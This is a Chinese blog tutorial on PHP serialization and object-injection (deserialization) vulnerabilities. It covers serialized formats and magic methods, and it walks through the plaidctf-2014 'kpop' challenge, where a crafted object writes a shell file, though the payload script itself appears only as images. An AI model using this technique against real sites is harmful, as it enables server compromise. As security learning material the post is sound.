<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="https://fonts.googleapis.com/css?family=Muli:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="php,">










<meta name="description" content="前言以前一直看 K0r3zn 师傅的一些文章，最近终于去加了师傅的好友 : )。师傅说学习要有一些知识的产出，那我就把前段时间学的知识整理一下吧~ 序列化与反序列化在 php 中，常见的序列化就是使用serialize()将一个对象中的信息用字符串的形式记录。因为对象是在内存中存储的，其会随着脚本结束而销毁。但有些情况下需要将对象当前的状态保存下来，比如其中含有一些之后可能用到的属性。对象序列化可">
<meta name="keywords" content="php">
<meta property="og:type" content="article">
<meta property="og:title" content="php反序列化">
<meta property="og:url" content="http://yoursite.com/2019/04/01/php反序列化/index.html">
<meta property="og:site_name" content="ll">
<meta property="og:description" content="前言以前一直看 K0r3zn 师傅的一些文章，最近终于去加了师傅的好友 : )。师傅说学习要有一些知识的产出，那我就把前段时间学的知识整理一下吧~ 序列化与反序列化在 php 中，常见的序列化就是使用serialize()将一个对象中的信息用字符串的形式记录。因为对象是在内存中存储的，其会随着脚本结束而销毁。但有些情况下需要将对象当前的状态保存下来，比如其中含有一些之后可能用到的属性。对象序列化可">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/01.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/02.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/03.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/04.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/05.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/06.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/07.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/08.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/09.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png">
<meta property="og:updated_time" content="2019-04-02T07:01:57.621Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="php反序列化">
<meta name="twitter:description" content="前言以前一直看 K0r3zn 师傅的一些文章，最近终于去加了师傅的好友 : )。师傅说学习要有一些知识的产出，那我就把前段时间学的知识整理一下吧~ 序列化与反序列化在 php 中，常见的序列化就是使用serialize()将一个对象中的信息用字符串的形式记录。因为对象是在内存中存储的，其会随着脚本结束而销毁。但有些情况下需要将对象当前的状态保存下来，比如其中含有一些之后可能用到的属性。对象序列化可">
<meta name="twitter:image" content="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/01.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/04/01/php反序列化/">





  <title>php反序列化 | ll</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ll</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/01/php反序列化/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ll">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ll">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">php反序列化</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-01T12:46:50+08:00">
                2019-04-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以前一直看 K0r3zn 师傅的一些文章，最近终于去加了师傅的好友 : )。师傅说学习要有一些知识的产出，那我就把前段时间学的知识整理一下吧~</p>
<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>在 php 中，常见的序列化就是使用<code>serialize()</code>将一个对象中的信息用字符串的形式记录。因为对象是在内存中存储的，其会随着脚本结束而销毁。但有些情况下需要将对象当前的状态保存下来，比如其中含有一些之后可能用到的属性。对象序列化可以将对象的状态通过数值和字符记录下来，便于存储和传输。在需要的时候将对象反序列化恢复后使用。序列化的对象可以是<code>class</code>、<code>array</code>等。<br>反序列化就是使用<code>unseralize()</code>将序列化后的字符串，还原成相应的对象，即序列化的逆过程。</p>
<h4 id="对象的属性初始化"><a href="#对象的属性初始化" class="headerlink" title="对象的属性初始化"></a>对象的属性初始化</h4><p>当给一个对象的属性初始化时，可以给其属性赋予<code>number</code>、<code>string</code>、<code>array</code>、<code>null</code>、<code>bool</code>类型的值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $num = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> $str = <span class="string">'ll'</span>;</span><br><span class="line">    <span class="keyword">public</span> $arr = <span class="keyword">array</span>(<span class="string">'ll'</span> =&gt; <span class="number">20</span>, <span class="string">'K'</span> =&gt; <span class="string">'person'</span>);</span><br><span class="line">    <span class="keyword">public</span> $n = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">// O:4:"test":5:&#123;s:3:"num";i:18;s:3:"str";s:2:"ll";s:3:"arr";a:2:&#123;s:2:"ll";i:20;s:1:"K";s:6:"person";&#125;s:1:"n";N;s:1:"b";b:1;&#125;</span></span><br></pre></td></tr></table></figure>
<p>如果在属性声明的时候赋予<code>object</code>类型，则会报错。但是可以在该对象的方法中为属性赋予<code>object</code>类型的值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LL</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj = <span class="keyword">new</span> LL();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// PHP Fatal error: Constant expression contains invalid operations</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> LL();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'hanhan'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $num = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> $str = <span class="string">'ll'</span>;</span><br><span class="line">    <span class="keyword">public</span> $arr = <span class="keyword">array</span>(<span class="string">'ll'</span> =&gt; <span class="number">20</span>, <span class="string">'K'</span> =&gt; <span class="string">'person'</span>);</span><br><span class="line">    <span class="keyword">public</span> $n = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> LL();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">// $a = serialize($a);</span></span><br><span class="line"><span class="comment">// var_dump(unserialize($a));</span></span><br></pre></td></tr></table></figure>
<p>这里所有属性都定义为 public 类型，对象序列化的大致格式如下：<br><code>O:类名长度:&quot;类名&quot;:对象的属性个数:{属性1;属性2;属性3;...}</code></p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/01.png" alt="01"></p>
<p>属性1、属性2…等属性的具体格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">number类型：s:属性名的长度:&quot;属性名&quot;;i:属性值</span><br><span class="line">string类型：s:属性名的长度:&quot;属性名&quot;;s:属性值的长度:属性值</span><br><span class="line">array类型：s:属性名的长度:&quot;属性名&quot;;a:数组长度:&#123;元素a，元素b...&#125;</span><br><span class="line">null类型：s:属性名的长度:&quot;属性名&quot;;N</span><br><span class="line">bool类型：s:属性名的长度:&quot;属性名&quot;;b:1 // 如果是false则以b:0结尾，b代表bool</span><br><span class="line">object类型：s:属性名的长度:&quot;属性名&quot;;O:类名长度:&quot;类名&quot;:对象的属性个数:&#123;属性1;属性2;...&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>array</code>类型和<code>object</code>类型的属性具体表示与上述格式一致。<br><strong>注意：序列化对象时，不会保存常量的值，但是会保留父类中的属性。</strong></p>
<h4 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h4><p><strong>public</strong>、<strong>private</strong>、<strong>protected</strong><br><code>public（公有）</code>：公有属性和方法可以在类的内部和外部访问。<br><code>private（私有）</code>：私有属性和方法只能在其被定义的类内部访问，不会被继承。<br><code>protected（受保护）</code>：受保护的属性和方法只能在内部访问，存在于任何子类中，可以被其自身以及其子类和父类访问。</p>
<p>前面使用的属性都是被定义为<code>public</code>，其序列化的格式如上。而被定义为<code>private</code>和<code>protected</code>的属性值在属性名处有所区别，其他部分同<code>public</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LL</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">'ll'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a); <span class="comment">// O:4:"test":2:&#123;s:10:"testname";s:2:"ll";s:6:"*age";i:12;&#125;</span></span><br><span class="line">$data = serialize($a); </span><br><span class="line">file_put_contents(<span class="string">"test.txt"</span>, $data);</span><br></pre></td></tr></table></figure>
<p>可以看到<code>private</code>属性名<code>name</code>变成了<code>testname</code>，而且该属性名的长度不是8，而是10。<code>protected</code>属性名<code>age</code>变成了<code>*age</code>，长度不是4，而是6。<br>实际上，<code>private</code>属性名的格式为<code>%00类名%00属性名</code>，即<code>%00test%00name</code>，而<code>protected</code>属性名的格式为<code>%00*%00属性名</code>，即<code>%00*%00name</code>。它们都增加了两个空字符<code>%00</code>，所以长度和实际看到的相差了2。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/02.png" alt="02"></p>
<p>我觉得可以这样记：<br>因为<code>private</code>属性只能在其被定义的类内部访问，且不会被继承，所以要在该属性前加上其<code>类名</code>，告诉我们它是私有的。而<code>protected</code>属性可以在其父类和子类中访问，所以在其前面加上<code>*</code>，告诉我们它是受保护的。最后不要忘记加上两个空字符<code>%00</code>。</p>
<p>php序列化只会对属性进行操作，不会对方法进行序列化。因为平常我们可能只需要在<code>1.php</code>中记录一个对象的状态，而在<code>2.php</code>中也有该类的定义，那我们便可以对<code>1.php</code>中的对象进行序列化，到<code>2.php</code>中进行反序列化取出该状态（属性值）去做后续处理。也可以将<code>1.php</code>中的实例化的对象长久地保存在磁盘等设备上。</p>
<h4 id="反序列化格式"><a href="#反序列化格式" class="headerlink" title="反序列化格式"></a>反序列化格式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'ll'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line">$a = serialize($a);</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(test)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">  ["name"]=&gt;</span></span><br><span class="line"><span class="comment">  string(2) "ll"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p>php 反序列化漏洞，又称 php 对象注入漏洞。因为序列化对象时，只会存储其属性，所以该漏洞可利用的一个基本条件是对象中的属性<strong>可控</strong>，除此之外，我们可能还需要一些函数的帮助来触发该漏洞。</p>
<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>php中将所有以<code>__</code>开头的类方法保留为魔术方法，它们都有一些特殊的用法。<br>常见的有：<br><code>__construct()</code>、<code>__destruct()</code>、<code>__call()</code>、<code>__callStatic()</code>、<code>__set()</code>、<code>__get()</code>、<br><code>__isset()</code>、<code>__unset()</code>、<code>__sleep()</code>、<code>__wakeup()</code>、<code>__toString()</code>、<code>__invoke()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__construct([ mixed $args = &quot;&quot; [, $...]]) : void</span><br><span class="line">构造函数。具有构造函数的类会在每次创建新对象时调用此方法，初始化对象。</span><br><span class="line"></span><br><span class="line">__destruct( void ) : void</span><br><span class="line">析构函数。会在某个对象的所有引用都被删除或者当对象被显示销毁时执行。</span><br><span class="line"></span><br><span class="line">public __sleep( void ) : array</span><br><span class="line">serialize()会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</span><br><span class="line">此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</span><br><span class="line">如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。</span><br><span class="line">__sleep()不能返回父类的私有成员的名字。这样会产生一个E_NOTICE级别的错误。</span><br><span class="line"></span><br><span class="line">__wakeup( void ) : void</span><br><span class="line">unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源。</span><br><span class="line">__wakeup()经常用于反序列化，例如重新建立数据库连接，或执行其他初始化操作。</span><br><span class="line"></span><br><span class="line">public __toString( void ) : string</span><br><span class="line">用于一个类被当成字符串时应该怎么回应。</span><br><span class="line">例如echo $obj;应该显示什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。</span><br><span class="line"></span><br><span class="line">__invoke([ $... ]) : mixed </span><br><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke()会被自动调用。</span><br></pre></td></tr></table></figure>
<p>这里要注意<code>toString()</code>触发的条件，当该对象被传入任何接收<code>string</code>类型参数的函数中时都会触发，且在将对象与字符串进行连接和比较等操作时也会触发。</p>
<p><strong>overloading</strong><br>动态地“创建”类属性和方法。通过魔术方法来实现。<br>当调用当前环境下未定义或不可见得类属性或方法时，重载方法会被调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public __call( string $name, array $arguments ) : mixed</span><br><span class="line">在对象中调用一个不可访问的方法时，__call()会被调用。</span><br><span class="line">$name：要调用的不存在的方法名称，$arguments：一个枚举数组，包含着要传递给方法$name的参数。</span><br><span class="line"></span><br><span class="line">public static __callStatic( string $name, array $arguments ) : mixed</span><br><span class="line">在静态上下文中调用一个不可访问的方法时，__callStatic()会被调用。</span><br><span class="line">$name：要调用的不存在的方法名称，$arguments：一个枚举数组，包含着要传递给方法$name的参数。</span><br><span class="line"></span><br><span class="line">属性重载只能在对象中进行。在静态方法中，这些魔术方法将不会被调用，所以这些方法都不能被声明为static。</span><br><span class="line">public __set( string $name, mixed $value ) : void</span><br><span class="line">在给不可访问属性赋值时，__set()会被调用。</span><br><span class="line"></span><br><span class="line">public __get( string $name ) : mixed</span><br><span class="line">读取不可访问属性的值时，__get()会被调用。</span><br><span class="line"></span><br><span class="line">public __isset( string $name ) : bool</span><br><span class="line">当对不可访问属性调用isset()和unset()时，__isset()会被调用。</span><br><span class="line"></span><br><span class="line">public __unset( string $name ) : void </span><br><span class="line">当对不可访问属性调用unset()时，__unset()会被调用。</span><br></pre></td></tr></table></figure>
<p>为什么说需要这些魔术方法呢？因为我们只是单纯地控制某一个变量的属性并不能造成什么危害，而当我们通过这些魔术方法当作跳板，去调用其他类中的一些危险的存在利用点的方法时，就会产生更大的危害。</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>以 plaidctf-2014 中的 <a href="https://github.com/iagox86/plaidctf-2014/tree/master/kpop" target="_blank" rel="noopener">kpop</a> 题目为例。实战一下，通过魔术方法去调用其他类中的方法达到写 shell 的目的。<br>下面是<code>classes.php</code>文件中我们主要利用的类：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/03.png" alt="03"></p>
<p>这题就不细讲了。我们可以看到从<code>Lyrics</code>类中的魔术方法<code>__destruct()</code>开始。会一路调用能过滤数据、写数据到日志的其他类。但是最后写入数据的<code>logs</code>目录，我们没有访问权限，而路径是由<code>LogWriter_File</code>类中的<code>$filename</code>属性控制，且过滤数据的规则是由<code>OutputFilter</code>类的属性控制，根据前面可知，只要我们能找到可控的利用点，传入我们序列化后的数据，我们就可以自由的改变类中属性的值。<br>仔细读一下代码，看懂了整个逻辑后，可以发现在<code>import.php</code>中存在反序列化操作：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = unserialize(base64_decode($_POST[<span class="string">'data'</span>]));</span><br></pre></td></tr></table></figure>
<p>所以整体思路就是，我们序列化恶意的数据，其中控制路径和过滤的类属性根据我们需要修改，传入<code>import.php</code>中，脚本结束后调用<code>__destruct()</code>方法产生漏洞。<br>我们可以简单复现一下。就只写出需要用到的类和方法，并把<code>import.php</code>中的入口写在同一文件。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/04.png" alt="04"></p>
<p>接下来是构造 payload 的脚本：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/05.png" alt="05"></p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/06.png" alt="06"></p>
<p>将该值上传，便可在相应的目录下看到 shell 文件：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/07.png" alt="07"></p>
